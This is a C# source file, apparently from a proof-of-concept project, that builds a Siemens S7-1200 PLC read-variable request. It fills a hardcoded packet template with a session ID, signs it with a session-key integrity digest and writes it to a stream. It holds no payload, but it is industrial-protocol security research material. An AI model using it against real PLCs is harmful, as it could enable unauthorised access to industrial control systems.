using System.Buffers.Binary;
using HarpoS7.Integrity;

namespace HarpoS7.PoC.Packets;

public class GetVarSubStreamedRequest
{
    private readonly uint _sessionId;
    private readonly byte[] _sessionKey;
    private const int RealPlcIntegrityOffset = 0x0C;
    private const int RealPlcDataOffset = 0x2C;
    private const int RealPlcDataLength = 0x35;
    
    private static readonly byte[] S71200Data = 
    [
        0x03, 0x00, 0x00, 0x65, 0x02, 0xF0, 0x80, 0x72, 0x03, 0x00, 0x56, 0x20,
        0xFD, 0xBF, 0xE6, 0xF8, 0x93, 0xA3, 0x7B, 0x6D, 0xBE, 0x4E, 0x30, 0xB9,
        0x8D, 0xD9, 0x98, 0x42, 0x98, 0xF2, 0xC8, 0xDB, 0x8A, 0x63, 0xF1, 0x84,
        0x71, 0x47, 0xF3, 0x2E, 0x1D, 0x1A, 0x9B, 0x8B, 0x31, 0x00, 0x00, 0x05,
        0x86, 0x00, 0x00, 0x00, 0x03, 0x70, 0x40, 0x00, 0x00, 0x34, 0x70, 0x40,
        0x00, 0x00, 0x20, 0x04, 0x01, 0x82, 0x2F, 0x00, 0x00, 0x04, 0xE8, 0x89,
        0x69, 0x00, 0x12, 0x00, 0x00, 0x00, 0x00, 0x89, 0x6A, 0x00, 0x13, 0x00,
        0x89, 0x6B, 0x00, 0x04, 0x00, 0x00, 0x00, 0x01, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x72, 0x03, 0x00, 0x00
    ];

    public GetVarSubStreamedRequest(ReadOnlySpan<byte> sessionKey, uint sessionId)
    {
        _sessionId = sessionId;
        _sessionKey = new byte[sessionKey.Length];
        sessionKey.CopyTo(_sessionKey.AsSpan());
    }

    public void WriteRealPlc(Stream stream)
    {
        Span<byte> buffer = stackalloc byte[S71200Data.Length];
        S71200Data.CopyTo(buffer);

        const int sessionIdOffset = 0x35;
        BinaryPrimitives.WriteUInt32BigEndian(buffer[sessionIdOffset..], _sessionId);
        BinaryPrimitives.WriteUInt32BigEndian(buffer[(sessionIdOffset + 5)..], _sessionId);
        
        HarpoPacketDigest.CalculateDigest(
            buffer[RealPlcIntegrityOffset..], 
            buffer.Slice(RealPlcDataOffset, RealPlcDataLength), 
            _sessionKey.AsSpan()
        );
        
        stream.Write(buffer);
    }
}